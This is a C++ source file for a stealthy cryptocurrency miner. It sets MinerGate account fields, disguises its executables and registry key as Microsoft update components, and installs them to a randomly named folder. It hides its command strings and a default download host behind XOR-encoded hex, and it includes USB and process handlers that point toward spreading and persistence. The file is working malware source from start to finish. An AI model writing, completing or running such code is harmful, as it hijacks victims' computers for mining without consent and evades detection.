#include "file_handler.h"
#include "proc_handler.h"
#include "reg_handler.h"
#include "usb_handler.h"
#include "crypto_handler.h"


string email		= ""; // MinerGate email
string coin		= ""; //ex. bcn
string url		= ""; //You can use default host -> XOR(hex_to_string("485A2B5A1A017048495A2B42454C265E45003C4C0F")); // -> http://bitthebyte.cf/
char* miner_name	= "MS-helper.exe";
char* exec_name		= "MS-update.exe";
char* lock_name		= "lock_file";
char* regKey_name	= "MS-update";
FILE_HANDLER		file_handler;
PROC_HANDLER		proc_handler;
REG_HANDLER		reg_handler;
USB_HANDLER		usb_handler;

bool replace(std::string& str, const std::string& from, const std::string& to) {
	size_t start_pos = str.find(from);
	if (start_pos == std::string::npos)
		return false;
	str.replace(start_pos, from.length(), to);
	return true;
}
string installPath() {

	string regKeyValue = (string)reg_handler.GetRegistry(regKey_name);
	if (regKeyValue != string("0")) {
		replace(regKeyValue, exec_name, "");
		return regKeyValue;
	}
	else {
		auto randchar = []() -> char
		{
			const char charset[] =
				"0123456789"
				"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
			const size_t max_index = (sizeof(charset) - 1);
			return charset[rand() % max_index];
		};
		std::string str(40, 0);
		std::generate_n(str.begin(), 40, randchar);
		return "C:\\" + str + "\\";
	}
}
string InstallPath = installPath();
string miner_path = (InstallPath + miner_name);
string execu_path = (InstallPath + exec_name);
string miner_background = XOR(hex_to_string("4D5D375E410E2948534D2D43505A656F584B3C5F544B7708635C3A4B544B10484A4B3C5E080C7D7D534D2D43505A7179484B3346020C7604725B310A020C")) + miner_path + XOR(hex_to_string("00032A59455C7F")) + email + XOR(hex_to_string("0003")) + coin + XOR(hex_to_string("020C")) + XOR(hex_to_string("0C1E736C41422C4F0207775D49403B4557003C464F5D3A03"));
